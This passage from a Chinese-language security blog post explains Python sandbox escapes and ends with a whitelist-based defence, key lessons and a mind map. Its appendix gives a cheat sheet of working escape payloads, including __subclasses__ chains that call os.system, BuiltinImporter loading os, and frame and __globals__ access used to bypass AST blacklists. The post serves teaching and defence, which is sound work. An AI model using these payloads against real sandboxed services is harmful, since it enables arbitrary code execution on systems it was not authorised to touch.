+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用 getattr 间接调用 format</span></span><br><span class="line"><span class="built_in">getattr</span>(<span class="string">&quot;&#123;0.gi_frame.f_locals[key]&#125;&quot;</span>, <span class="string">&quot;format&quot;</span>)(g)</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-终极方案：白名单策略"><a href="#8-3-终极方案：白名单策略" class="headerlink" title="8.3 终极方案：白名单策略"></a>8.3 终极方案：白名单策略</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SAFE_ATTRS = &#123;</span><br><span class="line">    <span class="comment"># 只允许基础类型的安全属性</span></span><br><span class="line">    <span class="string">&quot;real&quot;</span>, <span class="string">&quot;imag&quot;</span>, <span class="string">&quot;numerator&quot;</span>, <span class="string">&quot;denominator&quot;</span>,</span><br><span class="line">    <span class="string">&quot;start&quot;</span>, <span class="string">&quot;stop&quot;</span>, <span class="string">&quot;step&quot;</span>,</span><br><span class="line">    <span class="string">&quot;upper&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;strip&quot;</span>, <span class="string">&quot;replace&quot;</span>, <span class="string">&quot;split&quot;</span>,</span><br><span class="line">    <span class="string">&quot;join&quot;</span>, <span class="string">&quot;count&quot;</span>, <span class="string">&quot;index&quot;</span>, <span class="string">&quot;find&quot;</span>,</span><br><span class="line">    <span class="string">&quot;keys&quot;</span>, <span class="string">&quot;values&quot;</span>, <span class="string">&quot;items&quot;</span>, <span class="string">&quot;get&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(tree):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Attribute):</span><br><span class="line">        <span class="keyword">if</span> node.attr <span class="keyword">not</span> <span class="keyword">in</span> SAFE_ATTRS:</span><br><span class="line">            <span class="keyword">raise</span> SandboxError(<span class="string">f&quot;unsafe attribute: <span class="subst">&#123;node.attr&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>黑名单总有遗漏，白名单才能彻底封堵。</p>
+<h3 id="8-4-关键教训"><a href="#8-4-关键教训" class="headerlink" title="8.4 关键教训"></a>8.4 关键教训</h3><blockquote>
+<p><strong>沙箱逃逸的本质不是”Python 有漏洞”，而是”攻击者利用了 Python 强大而灵活的对象模型和反射能力，从本不应暴露的角度访问了内部机制”。</strong></p>
+</blockquote>
+<p>防御沙箱逃逸没有银弹。白名单 + 最小权限 + 深度防御 是唯一可靠的组合方案。</p>
+<hr>
+<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="A-常用-Payload-速查"><a href="#A-常用-Payload-速查" class="headerlink" title="A. 常用 Payload 速查"></a>A. 常用 Payload 速查</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 经典 __subclasses__ 链</span></span><br><span class="line"><span class="keyword">for</span> cls <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&quot;wrap_close&quot;</span>:</span><br><span class="line">        cls.__init__.__globals__[<span class="string">&quot;system&quot;</span>](<span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 通过 BuiltinImporter 加载 os</span></span><br><span class="line"><span class="keyword">for</span> cls <span class="keyword">in</span> ().__class__.__mro__[<span class="number">1</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&quot;BuiltinImporter&quot;</span>:</span><br><span class="line">        cls.load_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 异常回溯逃逸</span></span><br><span class="line"><span class="keyword">try</span>: <span class="number">1</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">except</span>: <span class="keyword">import</span> sys; sys.exc_info()[<span class="number">2</span>].tb_frame.f_globals</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. lambda 的 __globals__</span></span><br><span class="line">(<span class="keyword">lambda</span>: <span class="number">0</span>).__globals__[<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 生成器 frame 逃逸</span></span><br><span class="line">g = (x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line">g.gi_frame.f_globals[<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. format 绕过 AST 黑名单</span></span><br><span class="line">g = iter_preview_items()</span><br><span class="line"><span class="built_in">next</span>(g)</span><br><span class="line">field = <span class="string">&quot;&#123;0.gi_&quot;</span> + <span class="string">&quot;frame.f_&quot;</span> + <span class="string">&quot;locals[shipment_manifest]&#125;&quot;</span></span><br><span class="line">result = field.<span class="built_in">format</span>(g)</span><br></pre></td></tr></table></figure>
+
+<h3 id="B-逃逸手法思维导图"><a href="#B-逃逸手法思维导图" class="headerlink" title="B. 逃逸手法思维导图"></a>B. 逃逸手法思维导图</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Python 沙箱逃逸</span><br><span class="line">│</span><br><span class="line">├── 对象模型链</span><br><span class="line">│   ├── __class__ → __mro__ → __subclasses__()</span><br><span class="line">│   ├── __builtins__</span><br><span class="line">│   └── __globals__</span><br><span class="line">│</span><br><span class="line">├── 生成器 &amp; 帧</span><br><span class="line">│   ├── gi_frame → f_locals / f_globals</span><br><span class="line">│   ├── f_back → 向上回溯</span><br><span class="line">│   └── tb_frame (异常回溯)</span><br><span class="line">│</span><br><span class="line">├── 绕过技术</span><br><span class="line">│   ├── str.format() ← 本文重点</span><br><span class="line">│   ├── getattr() 替代 . 运算</span><br><span class="line">│   ├── 字符串拼接 chr/bytes</span><br><span class="line">│   ├── 嵌套 eval()</span><br><span class="line">│   └── import 技巧</span><br><span class="line">│</span><br><span class="line">└── 沙箱类型</span><br><span class="line">    ├── AST 黑名单 → format / 拼接绕过</span><br><span class="line">    ├── 命名空间限制 → __subclasses__ 链</span><br><span class="line">    ├── exec 限制 → eval / compile</span><br><span class="line">    └── 白名单 → 寻找遗漏的白名单类</span><br></pre></td></tr></table></figure>
+
+    </div>
+  </article>
+</section>
+
+  </main>
+
+  <!-- 页脚 -->
+  <footer>
+    <div class="footer-logo">My Blog</div>
+    <p>© 2026 ilovewxl</p>
+  </footer>
+
+  <script>
+    // 星空粒子
+    const c = document.getElementById('stars-canvas'), ctx = c.getContext('2d');
+    let stars = [];
+    function rs() { c.width = innerWidth; c.height = innerHeight; }
+    rs(); addEventListener('resize', rs);
+    for (let i = 200; i--;) stars.push({x:Math.random()*c.width,y:Math.random()*c.height,r:Math.random()*1.8+0.3,a:Math.random(),s:Math.random()*0.008+0.003});
+    function dr() { ctx.clearRect(0,0,c.width,c.height); for (const st of stars) { st.a+=st.s; const o=(Math.sin(st.a)+1)/2*0.6+0.1; ctx.beginPath(); ctx.arc(st.x,st.y,st.r,0,Math.PI*2); ctx.fillStyle=`rgba(240,245,242,${o})`; ctx.fill(); } requestAnimationFrame(dr); }
+    dr();
+    // 花瓣
+    const pc = document.getElementById('petalContainer');
+    for (let i = 20; i--;) { const p=document.createElement('div'); p.className='petal'; p.style.left=Math.random()*100+'%'; p.style.animationDuration=(Math.random()*10+14)+'s'; p.style.animationDelay=Math.random()*20+'s'; p.style.width=(Math.random()*10+10)+'px'; p.style.height=p.style.width; pc.appendChild(p); }
+    // 导航滚动
+    addEventListener('scroll',()=>document.getElementById('navbar').classList.toggle('scrolled',scrollY>60));
+  </script>
+</body>
+</html>
